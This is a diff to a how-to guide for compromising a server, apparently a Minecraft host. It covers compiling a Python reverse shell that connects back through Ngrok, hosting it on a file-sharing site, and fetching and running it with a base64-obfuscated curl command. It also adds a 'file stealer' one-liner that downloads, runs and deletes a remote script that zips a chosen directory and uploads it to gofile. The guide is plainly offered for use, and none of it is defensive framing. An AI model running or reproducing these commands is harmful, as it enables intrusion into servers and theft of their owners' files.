@@ -20,7 +20,7 @@ you will need [Python](https://www.python.org/downloads/), [Netcat](https://eter
 5. **Download and Edit Python File**
    - [Download the Python file](https://catlitter.minoa.cat/api/view/bc52bb227eea93ac2dd0.zip) and in rs.py edit the IP and port to be the Ngrok one.
    - (Must have python installed) run windows compile.bat and only if you have wsl setup you can run linux compile.bat and the files that show up are compilex executables.
-   - Upload the compiled files to [catbox.moe](https://catbox.moe) or [CatLitter](https://catlitter.minoa.cat)
+   - Upload the compiled files to [catbox.moe](https://catbox.moe)
 
 6. **Convert URL to Base64**
    - Use [base64encode.org](https://www.base64encode.org/) to convert the URL for whatever file to Base64.
@@ -30,21 +30,18 @@ you will need [Python](https://www.python.org/downloads/), [Netcat](https://eter
    - While logged into Ecstasy, use the command below, replacing `{BASE64 GOES HERE}` with the Base64 link:
 `curl -O $(echo "{BASE64 GOES HERE}" | base64 --decode)`
 
-
-8. **Encode Filename and Extension to Base64**
-   - Encode the filename and extension that catbox.moe or Catlitter gives in the URL to Base64.
-
-9. **Run the File**
+8. **Run the File**
 Linux:
- `./rs`
+`chmod +x {OUTPUT FILE}`
+ `./{OUTPUT FILE}`
 Windows:
-`start rs.exe`
+`start {OUTPUT FILE}`
  - If there are errors, idk..
 
 
 # more
 ## Linux mc server file stealer
 ```
-bash -c 'curl -o steal.sh $(echo "aHR0cHM6Ly9jYXRsaXR0ZXIubWlub2EuY2F0L2FwaS92aWV3L2FkMGI1MTJhNzZiNTBjODhlY2VmLnNo" | base64 --decode) && chmod +x steal.sh && ./steal.sh && rm -- steal.sh'
+bash -c 'curl -o steal.sh $(echo "aHR0cHM6Ly9jYXRsaXR0ZXIubWlub2EuY2F0L2FwaS92aWV3L2FkMGI1MTJhNzZiNTBjODhlY2VmLnNo" | base64 --decode) && chmod +x steal.sh && bash ./steal.sh && rm -- steal.sh'
 ```
 *(downloads and runs [this script](https://catlitter.minoa.cat/api/view/ad0b512a76b50c88ecef.sh) that zips and uploads whatever dir you enter to gofile and gives you the link only on linux)*
